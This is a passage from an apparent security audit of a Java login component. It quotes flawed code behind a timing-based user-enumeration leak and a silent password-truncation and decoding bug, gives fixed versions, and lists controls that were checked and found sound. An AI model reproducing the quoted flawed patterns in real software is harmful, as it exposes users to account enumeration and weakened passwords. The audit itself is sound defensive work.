            MessageDigest.isEqual(derived, DUMMY_HASH);
            return false;
        } finally {
```

**Why it is a problem:** The dummy derivation always runs at `DEFAULT_ITERATIONS`, whereas
the real path derives at the *stored* `storedIterations` read from the user's row
(`PasswordHasher.java:127`), which `InputValidator.isValidDatabaseHashParameters` permits to
be anything from 100 000 to 10 000 000. Once any account exists whose iteration count
differs from the current default — the expected state after a work-factor increase, and the
reason the count is stored per row at all — the "account not found" path
(`AuthenticationService.java:104-110`) and the "wrong password" path take measurably
different amounts of time. That difference is a user-enumeration oracle, defeating the
uniform-message design in `AuthenticationResult`. The gap can be large (a 10 000 000
iteration row takes ~50× the dummy's time), making it observable even over a network with
averaging. A second, smaller discrepancy exists in `AuthenticationService`: the malformed
input path (line 88) skips the database round trip entirely, while the account-not-found
path performs it.

**Fix:** Derive the dummy hash with the same iteration count distribution as real accounts,
by storing a dummy "user record" with the current policy parameters and having the
not-found path verify against it; and normalise total handler time to a fixed budget so that
skipped work (database lookup, validation) cannot be distinguished.

```java
    /**
     * Executes a dummy derivation using the SAME parameters a real account would use, so the
     * account-missing path is indistinguishable in time from the wrong-password path.
     */
    public boolean verifyDummyPassword(char[] candidatePassword, int iterationsToMatch) {
        char[] passwordToUse = (candidatePassword != null && InputValidator.isValidPasswordForAuth(candidatePassword))
                ? candidatePassword
                : DUMMY_INPUT_PASSWORD;

        int iterations = (iterationsToMatch >= InputValidator.MIN_PBKDF2_ITERATIONS
                && iterationsToMatch <= InputValidator.MAX_PBKDF2_ITERATIONS)
                ? iterationsToMatch
                : this.iterations;

        byte[] derived = null;
        try {
            derived = deriveKey(passwordToUse, DUMMY_SALT, iterations, KEY_BIT_LENGTH);
            MessageDigest.isEqual(derived, DUMMY_HASH);
            return false;
        } finally {
            if (derived != null) {
                Arrays.fill(derived, (byte) 0);
            }
        }
    }
```

### SEC-10: Silent password truncation and byte-to-char decoding on the stdin path
- **Severity:** Low
- **CWE:** CWE-20: Improper Input Validation
- **Location:** `src/main/java/com/example/auth/Main.java:178-194`

**Vulnerable code:**
```java
// src/main/java/com/example/auth/Main.java:178-194
    private static char[] readPasswordDirect(InputStream in) throws IOException {
        char[] buffer = new char[InputValidator.MAX_PASSWORD_LENGTH + 2];
        int len = 0;
        int b;
        while ((b = in.read()) != -1) {
            if (b == '\n') {
                break;
            }
            if (b != '\r') {
                if (len < InputValidator.MAX_PASSWORD_LENGTH) {
                    buffer[len++] = (char) b;
                }
            }
        }
        char[] password = Arrays.copyOf(buffer, len);
        Arrays.fill(buffer, '\0');
        return password;
    }
```

**Why it is a problem:** Input beyond 128 characters is discarded silently rather than
rejected, so a user who sets a 200-character passphrase is actually protected by its first
128 characters and is never told. More seriously, each byte is cast directly to a `char`,
which is a Latin-1 decode of what is almost always a UTF-8 stream: every non-ASCII character
becomes two or three `char`s, consuming the 128-character budget two to three times as fast
and making the truncation boundary fall mid-character. A password can therefore be truncated
to a different value at registration than at login (or vice versa) depending on where the
boundary lands, locking users out — and the `(char) b` decode means the derived key is
computed over mojibake rather than the user's actual passphrase, silently shrinking the
effective keyspace for non-ASCII input. `Main.readEmail` has the same decoding flaw at
`Main.java:172`, where `(char) b` also allows arbitrary raw bytes into the e-mail string
before validation.

**Fix:** Reject over-length input explicitly instead of truncating, and decode the stream as
UTF-8 so the `char[]` holds the characters the user actually typed.

```java
    private static char[] readPasswordDirect(InputStream in) throws IOException {
        // Decode as UTF-8 rather than casting raw bytes to char.
        Reader reader = new InputStreamReader(in, StandardCharsets.UTF_8);
        char[] buffer = new char[InputValidator.MAX_PASSWORD_LENGTH + 1];
        int len = 0;
        int c;
        try {
            while ((c = reader.read()) != -1 && c != '\n') {
                if (c == '\r') {
                    continue;
                }
                if (len >= buffer.length) {
                    // Fail loudly instead of silently weakening the password.
                    throw new IOException("Password exceeds "
                            + InputValidator.MAX_PASSWORD_LENGTH + " characters");
                }
                buffer[len++] = (char) c;
            }
            return Arrays.copyOf(buffer, len);
        } finally {
            Arrays.fill(buffer, '\0');
        }
    }
```

## 6. Verified Controls and Checks With No Finding

- **SQL injection (CWE-89):** every statement in `UserRepository.java` is a constant string
  bound through `PreparedStatement` — `SELECT_USER_BY_EMAIL` (line 21) with `setString`
  (line 45), `INSERT_USER` (line 24) with `setString`/`setInt` (lines 100-105), and
  `COUNT_USERS` (line 27) with no parameters. No string concatenation or interpolation of
  user data into SQL anywhere in the codebase. The DDL in
  `DatabaseManager.initializeSchema` (`DatabaseManager.java:62-76`) is a fixed text block
  with no interpolation.
- **Second-order trust of database values (CWE-20):** values read back from the `users` table
  are re-validated before use — null-field check (`UserRepository.java:58-61`), Base64 decode
  guarded by `catch (IllegalArgumentException)` (`UserRepository.java:71-74`), and
  `InputValidator.isValidDatabaseHashParameters` enforcing algorithm identity, iteration
  bounds (100 000–10 000 000), salt length 16–64 bytes and hash length exactly 32 bytes
  (`InputValidator.java:143-158`). `PasswordHasher.verifyPassword` repeats the same checks
  independently (`PasswordHasher.java:103-125`), so a tampered row degrades to a failed login
  rather than a weakened derivation.
- **Password storage (CWE-256/CWE-759/CWE-760):** PBKDF2 with a per-user 16-byte
  `SecureRandom` salt (`PasswordHasher.java:69-70`) and a 256-bit derived key; no global salt,
  no unsalted or reversible storage, no `String` ever holds the plaintext password.
- **Constant-time hash comparison (CWE-208):** `MessageDigest.isEqual` is used for the
  credential comparison (`PasswordHasher.java:128`) rather than `Arrays.equals` or `==`.
- **Randomness quality (CWE-338/CWE-330):** `java.security.SecureRandom` is used for salts
  (`PasswordHasher.java:24`) and for 32-byte / 256-bit session tokens
  (`SessionManager.java:27, 67-68`). No `java.util.Random`, no `Math.random()`, no
  time-derived seeds anywhere in the codebase.
- **Session token properties:** tokens are server-generated only, never accepted or derived
  from caller input; encoded URL-safe Base64 without padding; given an absolute expiry
  (`SessionManager.java:76-77`) that `validateSession` enforces while also removing the
  stale entry (`SessionManager.java:94-107`); `invalidateSession` provides server-side
  revocation (`SessionManager.java:109-113`). The cookie is built with the `__Host-` prefix,
  `Secure`, `HttpOnly`, `SameSite=Strict`, `Path=/` and `Max-Age`
  (`SessionManager.java:80-83`) — the correct attribute set. (Exposure of the token value
  is reported separately as SEC-04.)
- **Memory hygiene (CWE-226):** password `char[]` buffers are zeroised in `finally` blocks on
  every path — `AuthenticationService.authenticate` (lines 135-140),
  `AuthenticationService.registerUser` (lines 182-186), `Main.handleAuthentication`
  (lines 94-98), `Main.handleRegistration` (lines 126-132),
  `Main.readPasswordDirect` (line 193) — and intermediate salt/key byte arrays plus
  `PBEKeySpec.clearPassword()` are cleared in `PasswordHasher` (lines 78-83, 130-140,
  161-165, 178-180).
- **User enumeration via messages (CWE-204):** all four failure modes map to fixed generic
  strings in `AuthenticationResult` (lines 21-24, 43-52); the discriminating reason
  (`ACCOUNT_NOT_FOUND` vs `INACTIVE_ACCOUNT` vs `PASSWORD_MISMATCH`) goes only to the audit
  log (`AuthenticationService.java:107-108, 124`). Registration likewise returns one message
  for both "invalid e-mail" and "already exists" (`Main.java:123`). The constant-work dummy
  derivation is invoked on every failing path (`AuthenticationService.java:88, 105`;
  `PasswordHasher.java:104, 113, 118, 123`) — the residual timing gap is SEC-09.
- **Log injection / CRLF log forging (CWE-117):** `SecurityLogger.sanitizeCrlf`
  (lines 87-92) neutralises `\r` and `\n`, and is applied to every interpolated field in
  `logAuthSuccess`, `logAuthFailure`, `logRateLimitExceeded` and `logSystemError`
  (lines 94-111). E-mails are masked before logging (`maskEmail`, lines 45-69) and tokens are
  truncated (`maskToken`, lines 74-82).
- **Secrets in source (CWE-798):** no API keys, passwords, or cryptographic keys are embedded.
  The only password-like literal is `DUMMY_INPUT_PASSWORD` (`PasswordHasher.java:29`), which
  is a deliberate constant-work placeholder compared only against a locally derived dummy
  hash and never used as a credential. Database credentials come from the environment
  (`DatabaseManager.java:140-148`) — the insecure *default* is reported as SEC-05.
- **Sensitive data in logs:** verified that no code path logs a password, a derived key, a
  salt or a full session token. `logSystemError` passes `Throwable` stack traces to the
  logger but the exceptions raised (`SecurityException` at `PasswordHasher.java:177`,
  `SQLException` from JDBC) do not carry credential values.
- **ReDoS (CWE-1333):** `EMAIL_PATTERN` (`InputValidator.java:27-29`) and
  `SOURCE_ID_PATTERN` (lines 32-34) were analysed for catastrophic backtracking. Both are
  anchored, and the repeated groups are separated by mandatory literal delimiters
  (`\.` in the domain and local part), which fixes the partition of any candidate string and
  keeps matching linear; there is no nested unbounded quantifier over an overlapping
  character class. Inputs are additionally length-capped to 254 characters before matching
  (lines 56-58) and 64 characters for source ids (lines 123-125).
- **Control characters in e-mail input:** `isValidEmail` rejects C0 controls, `0x7F` and all
  whitespace before the regex runs (`InputValidator.java:61-66`), and canonicalisation uses
  `Locale.ROOT` (line 81) so no Turkish-I style case-folding collision can map two distinct
  addresses onto one account.
- **Fail-closed behaviour (CWE-636):** database errors return `internalError()` rather than
  proceeding (`AuthenticationService.java:98-101`); corrupt rows yield `Optional.empty()`
  (`UserRepository.java:58-74`); inactive accounts are refused
  (`AuthenticationService.java:104`, `UserRecord.isActive()`); schema initialisation failure
  throws rather than running without a schema (`DatabaseManager.java:81-83`).
- **Concurrency (CWE-362):** `AttemptTracker`'s `tryAcquire`, `getCount`, `isExpired` and
  `reset` are all `synchronized` (`RateLimiter.java:62, 70, 82, 89`), so the check-and-
  increment is atomic; trackers are published through `ConcurrentHashMap.computeIfAbsent`
  (`RateLimiter.java:188-192`). Registration's check-then-insert
  (`AuthenticationService.java:160-164`) is wrapped in an explicit transaction with the
  database `UNIQUE` constraint on `email` (`DatabaseManager.java:66`) as the authoritative
  backstop, and rolls back on conflict.
- **Local database file permissions (CWE-732):** `ensureSecureFilePermissionsIfLocal`
  applies `rwx------` to the containing directory and `rw-------` to `<db>.mv.db` on POSIX
  filesystems, both at construction and after schema creation
  (`DatabaseManager.java:90-125`), with a capability check before use (line 128).
- **Resource leaks:** all `Connection`, `PreparedStatement`, `ResultSet` and `Statement`
  objects are opened in try-with-resources (`UserRepository.java:44, 47, 99, 115-116`;
  `AuthenticationService.java:96, 156`; `DatabaseManager.java:78-79`; `Main.java:43, 51`).
- **Insecure deserialization (CWE-502):** no `ObjectInputStream`, no XML/YAML/JSON
  deserialization, no reflection-based object construction anywhere in the codebase.
- **OS command execution and path traversal (CWE-78/CWE-22):** no `Runtime.exec`,
  `ProcessBuilder`, or `ScriptEngine` use. The only filesystem paths are derived from the
  JDBC URL inside `DatabaseManager` (SEC-03 covers the lack of validation on that URL); no
  user-supplied value reaches a file path.
- **Outbound network calls / TLS:** the component makes no outbound HTTP or socket
  connections, so there is no TLS client configuration, certificate validation or hostname
  verification to audit; no `TrustManager`/`HostnameVerifier` overrides exist.
- **Dependencies (CWE-1395/CWE-937):** `pom.xml` declares only H2 2.2.224 and JUnit 5.10.2
  (test scope). H2 2.2.224 post-dates the `jdbc:h2` RCE fixes of CVE-2021-42392 /
  CVE-2022-23221 (fixed in 2.1.212); the residual risk is the `INIT`/`RUNSCRIPT`
  connection-setting behaviour that is by design and must be controlled by validating the
  URL (SEC-03). Noted but not raised as a finding: `maven-shade-plugin` strips
  `META-INF/*.SF|*.DSA|*.RSA` (`pom.xml:96-102`), which is the standard fat-jar workaround
  but does mean the shipped artefact carries no verifiable dependency signatures.
- **Test code:** the six JUnit classes under `src/test/java` contain only test-scoped
  credentials and local in-memory database configuration; no production secret, key, or
  live endpoint is embedded, and nothing in them widens the shipped attack surface.
